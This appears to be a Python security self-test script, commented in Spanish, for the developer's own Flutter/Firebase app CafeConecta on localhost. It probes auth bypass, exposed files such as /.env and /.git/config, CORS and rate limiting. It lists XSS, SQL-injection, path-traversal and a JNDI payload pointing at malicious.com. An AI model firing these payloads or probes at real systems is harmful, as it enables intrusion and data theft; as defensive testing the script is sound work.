import requests
import json
import time
from datetime import datetime
import subprocess
import os
import urllib.parse

class SecurityTestCafeConecta:
    def __init__(self):
        self.url_base = "http://localhost:3000"
        self.resultados = {}
        self.vulnerabilidades_encontradas = []
        
    def crear_reporte_seguridad(self):
        """Crear directorio para reportes de seguridad"""
        if not os.path.exists("reportes_seguridad_cafeconecta"):
            os.makedirs("reportes_seguridad_cafeconecta")
    
    def test_firebase_security_rules(self):
        """Verificar configuraci√≥n de seguridad de Firebase"""
        print("\nüî• PRUEBA: Configuraci√≥n de Firebase")
        print("="*50)
        
        vulnerabilidades = []
        
        # Verificar si las reglas de Firebase est√°n expuestas
        print("   üîç Verificando exposici√≥n de configuraci√≥n...")
        
        try:
            # Intentar acceder a archivos de configuraci√≥n comunes
            urls_config = [
                f"{self.url_base}/.well-known/assetlinks.json",
                f"{self.url_base}/firebase-messaging-sw.js",
                f"{self.url_base}/manifest.json"
            ]
            
            for url in urls_config:
                try:
                    response = requests.get(url, timeout=5)
                    if response.status_code == 200:
                        print(f"   ‚úÖ Archivo encontrado: {url}")
                        # Verificar si contiene informaci√≥n sensible
                        if "firebase" in response.text.lower():
                            print(f"   ‚ö†Ô∏è Contiene configuraci√≥n Firebase")
                except:
                    continue
            
            print("   üí° Recomendaci√≥n: Verificar que las reglas de Firestore sean restrictivas")
            
        except Exception as e:
            print(f"   ‚ùå Error en prueba Firebase: {e}")
        
        return vulnerabilidades
    
    def test_authentication_bypass(self):
        """Probar bypass de autenticaci√≥n"""
        print("\nüîê PRUEBA: Bypass de Autenticaci√≥n")
        print("="*50)
        
        vulnerabilidades = []
        
        # Intentar acceder a rutas protegidas sin autenticaci√≥n
        rutas_protegidas = [
            "/#/home",
            "/#/registrar_kilos", 
            "/#/chat"
        ]
        
        for ruta in rutas_protegidas:
            try:
                url = f"{self.url_base}{ruta}"
                print(f"   üîç Probando acceso a: {ruta}")
                
                response = requests.get(url, timeout=5)
                
                if response.status_code == 200:
                    # Verificar si la p√°gina se carga sin autenticaci√≥n
                    if "login" not in response.text.lower():
                        vulnerabilidades.append(f"Posible bypass en {ruta}")
                        print(f"   ‚ö†Ô∏è VULNERABILIDAD: Acceso sin autenticaci√≥n a {ruta}")
                    else:
                        print(f"   ‚úÖ Redirige correctamente a login")
                
            except Exception as e:
                print(f"   ‚ùå Error probando {ruta}: {e}")
        
        return vulnerabilidades
    
    def test_input_validation(self):
        """Probar validaci√≥n de entrada en formularios"""
        print("\nüìù PRUEBA: Validaci√≥n de Entrada")
        print("="*50)
        
        vulnerabilidades = []
        
        # Payloads de prueba para inyecciones
        payloads_xss = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "';alert('XSS');//"
        ]
        
        payloads_injection = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "../../../etc/passwd",
            "${jndi:ldap://malicious.com/}"
        ]
        
        print("   üîç Probando payloads XSS...")
        for payload in payloads_xss:
            print(f"   Testing: {payload[:30]}...")
            # Aqu√≠ normalmente probar√≠as contra formularios reales
            # Como es Flutter web, esto ser√≠a m√°s complejo
        
        print("   üîç Probando payloads de inyecci√≥n...")
        for payload in payloads_injection:
            print(f"   Testing: {payload[:30]}...")
        
        print("   üí° Nota: Flutter web renderiza en canvas, XSS tradicional es limitado")
        print("   üí° Firebase Firestore previene inyecciones SQL autom√°ticamente")
        
        return vulnerabilidades
    
    def test_information_disclosure(self):
        """Probar divulgaci√≥n de informaci√≥n"""
        print("\nüïµÔ∏è PRUEBA: Divulgaci√≥n de Informaci√≥n")
        print("="*50)
        
        vulnerabilidades = []
        
        # Archivos y directorios sensibles comunes
        archivos_sensibles = [
            "/.env",
            "/config.json",
            "/firebase-config.js",
            "/main.dart.js.map",
            "/.git/config",
            "/web.config",
            "/robots.txt",
            "/sitemap.xml"
        ]
        
        for archivo in archivos_sensibles:
            try:
                url = f"{self.url_base}{archivo}"
                response = requests.get(url, timeout=5)
                
                if response.status_code == 200:
                    print(f"   ‚ö†Ô∏è ENCONTRADO: {archivo}")
                    
                    # Verificar contenido sensible
                    contenido = response.text.lower()
                    if any(palabra in contenido for palabra in ['password', 'secret', 'key', 'token']):
                        vulnerabilidades.append(f"Informaci√≥n sensible en {archivo}")
                        print(f"   üö® CR√çTICO: Informaci√≥n sensible en {archivo}")
                    else:
                        print(f"   ‚úÖ Sin informaci√≥n sensible aparente")
                        
            except:
                continue
        
        return vulnerabilidades
    
    def test_cors_configuration(self):
        """Probar configuraci√≥n CORS"""
        print("\nüåê PRUEBA: Configuraci√≥n CORS")
        print("="*50)
        
        vulnerabilidades = []
        
        try:
            headers = {
                'Origin': 'https://malicious.com',
                'Access-Control-Request-Method': 'GET',
                'Access-Control-Request-Headers': 'Content-Type'
            }
            
            response = requests.options(self.url_base, headers=headers, timeout=5)
            
            cors_headers = {
                'Access-Control-Allow-Origin': response.headers.get('Access-Control-Allow-Origin'),
                'Access-Control-Allow-Credentials': response.headers.get('Access-Control-Allow-Credentials'),
                'Access-Control-Allow-Methods': response.headers.get('Access-Control-Allow-Methods')
            }
            
            print(f"   üìã Headers CORS encontrados:")
            for header, value in cors_headers.items():
                if value:
                    print(f"   {header}: {value}")
                    
                    # Verificar configuraciones inseguras
                    if header == 'Access-Control-Allow-Origin' and value == '*':
                        vulnerabilidades.append("CORS muy permisivo (Allow-Origin: *)")
                        print(f"   ‚ö†Ô∏è CORS muy permisivo detectado")
            
        except Exception as e:
            print(f"   ‚ùå Error probando CORS: {e}")
        
        return vulnerabilidades
    
    def test_flutter_specific_security(self):
        """Pruebas espec√≠ficas de seguridad para Flutter web"""
        print("\nüì± PRUEBA: Seguridad Espec√≠fica de Flutter")
        print("="*50)
        
        vulnerabilidades = []
        
        try:
            response = requests.get(self.url_base, timeout=10)
            contenido = response.text
            
            # Verificar si est√° en modo debug
            if 'flutter_service_worker.js' in contenido:
                print("   ‚úÖ Service Worker de Flutter detectado")
            
            if 'canvaskit' in contenido.lower():
                print("   ‚úÖ CanvasKit renderer detectado")
            
            # Verificar informaci√≥n de debug expuesta
            if 'debug' in contenido.lower() or 'development' in contenido.lower():
                print("   ‚ö†Ô∏è Posibles referencias de debug encontradas")
                vulnerabilidades.append("Referencias de debug en producci√≥n")
            
            # Verificar source maps expuestos
            if '.map' in contenido:
                print("   ‚ö†Ô∏è Source maps pueden estar expuestos")
                vulnerabilidades.append("Source maps expuestos")
            
        except Exception as e:
            print(f"   ‚ùå Error en prueba Flutter: {e}")
        
        return vulnerabilidades
    
    def test_rate_limiting(self):
        """Probar l√≠mites de velocidad"""
        print("\n‚ö° PRUEBA: Rate Limiting")
        print("="*50)
        
        vulnerabilidades = []
        
        print("   üîç Probando m√∫ltiples solicitudes...")
        
        # Realizar m√∫ltiples solicitudes r√°pidas
        tiempos_respuesta = []
        
        for i in range(10):
            try:
                inicio = time.time()
                response = requests.get(f"{self.url_base}/#/login", timeout=5)
                tiempo = time.time() - inicio
                tiempos_respuesta.append(tiempo)
                
                if i == 0:
                    print(f"   üìä Primera solicitud: {tiempo:.2f}s")
                elif i == 9:
                    print(f"   üìä √öltima solicitud: {tiempo:.2f}s")
                    
            except Exception as e:
                print(f"   ‚ùå Error en solicitud {i}: {e}")
        
        # Analizar si hay rate limiting
        promedio = sum(tiempos_respuesta) / len(tiempos_respuesta) if tiempos_respuesta else 0
        
        if promedio < 0.1:
            print("   ‚ö†Ô∏è No hay evidencia de rate limiting")
            vulnerabilidades.append("Ausencia de rate limiting")
        else:
            print("   ‚úÖ Tiempos de respuesta normales")
        
        return vulnerabilidades
    
    def ejecutar_todas_las_pruebas(self):
        """Ejecutar todas las pruebas de seguridad"""
        print("üõ°Ô∏è AN√ÅLISIS DE SEGURIDAD CAFECONECTA")
        print("="*60)
        print(f"üéØ Objetivo: {self.url_base}")
        print(f"‚è∞ Inicio: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        
        self.crear_reporte_seguridad()
        
        # Verificar que la aplicaci√≥n est√© corriendo
        try:
            response = requests.get(self.url_base, timeout=5)
            if response.status_code != 200:
                print("‚ùå CafeConecta no est√° accesible")
                return
        except:
            print("‚ùå No se puede conectar a CafeConecta")
            print("üí° Ejecuta: flutter run -d chrome --web-port 3000")
            return
        
        print("‚úÖ CafeConecta detectado, iniciando pruebas...\n")
        
        # Ejecutar todas las pruebas
        pruebas = [
            ("Firebase Security", self.test_firebase_security_rules),
            ("Authentication Bypass", self.test_authentication_bypass),
            ("Input Validation", self.test_input_validation),
            ("Information Disclosure", self.test_information_disclosure),
            ("CORS Configuration", self.test_cors_configuration),
            ("Flutter Security", self.test_flutter_specific_security),
            ("Rate Limiting", self.test_rate_limiting)
        ]
        
        todas_vulnerabilidades = []
        
        for nombre_prueba, funcion_prueba in pruebas:
            try:
                vulnerabilidades = funcion_prueba()
                todas_vulnerabilidades.extend(vulnerabilidades)
                time.sleep(1)  # Pausa entre pruebas
            except Exception as e:
                print(f"‚ùå Error en {nombre_prueba}: {e}")
        
        # Generar reporte final
        self.generar_reporte_final(todas_vulnerabilidades)
    
    def generar_reporte_final(self, vulnerabilidades):
        """Generar reporte final de seguridad"""
        print("\n" + "="*60)
        print("üìä REPORTE FINAL DE SEGURIDAD")
        print("="*60)
        
        if vulnerabilidades:
            print(f"‚ö†Ô∏è VULNERABILIDADES ENCONTRADAS: {len(vulnerabilidades)}")
            print()
            
            for i, vuln in enumerate(vulnerabilidades, 1):
                print(f"{i}. üö® {vuln}")
            
            print("\nüîß RECOMENDACIONES GENERALES:")
            print("   1. üî• Revisar reglas de Firebase Firestore")
            print("   2. üîê Implementar autenticaci√≥n robusta")
            print("   3. üìù Validar todas las entradas del usuario")
            print("   4. üïµÔ∏è No exponer informaci√≥n sensible")
            print("   5. üåê Configurar CORS apropiadamente")
            print("   6. ‚ö° Implementar rate limiting")
            print("   7. üì± Construir en modo release para producci√≥n")
            
        else:
            print("‚úÖ NO SE ENCONTRARON VULNERABILIDADES CR√çTICAS")
            print("üí° Esto es bueno, pero siempre hay margen de mejora")
        
        print(f"\nüìù RECOMENDACIONES ESPEC√çFICAS PARA CAFECONECTA:")
        print("   ‚Ä¢ üî• Firebase: Usar reglas restrictivas en Firestore")
        print("   ‚Ä¢ üîê Auth: Validar tokens en todas las operaciones")
        print("   ‚Ä¢ üì± Flutter: Compilar con --release para producci√≥n")
        print("   ‚Ä¢ üõ°Ô∏è HTTPS: Usar siempre HTTPS en producci√≥n")
        
        # Guardar reporte en archivo
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        archivo_reporte = f"reportes_seguridad_cafeconecta/reporte_seguridad_{timestamp}.txt"
        
        with open(archivo_reporte, 'w', encoding='utf-8') as f:
            f.write(f"REPORTE DE SEGURIDAD CAFECONECTA\n")
            f.write(f"Fecha: {datetime.now()}\n")
            f.write(f"URL: {self.url_base}\n\n")
            f.write(f"Vulnerabilidades encontradas: {len(vulnerabilidades)}\n\n")
            
            for i, vuln in enumerate(vulnerabilidades, 1):
                f.write(f"{i}. {vuln}\n")
        
        print(f"\nüíæ Reporte guardado: {archivo_reporte}")

# Funci√≥n para mostrar informaci√≥n sobre SQLMap
def mostrar_info_sqlmap():
    """Mostrar informaci√≥n sobre SQLMap y por qu√© no es aplicable"""
    print("\n‚ùì SOBRE SQLMAP Y CAFECONECTA")
    print("="*50)
    print("SQLMap es una herramienta para encontrar inyecciones SQL en:")
    print("   ‚Ä¢ Bases de datos relacionales (MySQL, PostgreSQL, etc.)")
    print("   ‚Ä¢ Aplicaciones que usan consultas SQL din√°micas")
    print("   ‚Ä¢ Endpoints web que procesan par√°metros SQL")
    print()
    print("CafeConecta usa:")
    print("   ‚Ä¢ Firebase Firestore (NoSQL)")
    print("   ‚Ä¢ Flutter web (no endpoints SQL tradicionales)")
    print("   ‚Ä¢ Autenticaci√≥n Firebase (no SQL)")
    print()
    print("üí° Por esto, SQLMap NO ES APLICABLE a CafeConecta")
    print("üí° Las pruebas de este script son m√°s apropiadas")

if __name__ == "__main__":
    print("üõ°Ô∏è HERRAMIENTAS DE SEGURIDAD PARA CAFECONECTA")
    print("="*60)
    print("1. üîç Ejecutar an√°lisis de seguridad completo")
    print("2. ‚ùì Informaci√≥n sobre SQLMap")
    print("0. ‚ùå Salir")
    print()
    
    opcion = input("Selecciona una opci√≥n: ").strip()
    
    if opcion == "1":
        tester = SecurityTestCafeConecta()
        tester.ejecutar_todas_las_pruebas()
    elif opcion == "2":
        mostrar_info_sqlmap()
    else:
        print("üëã ¬°Hasta luego!")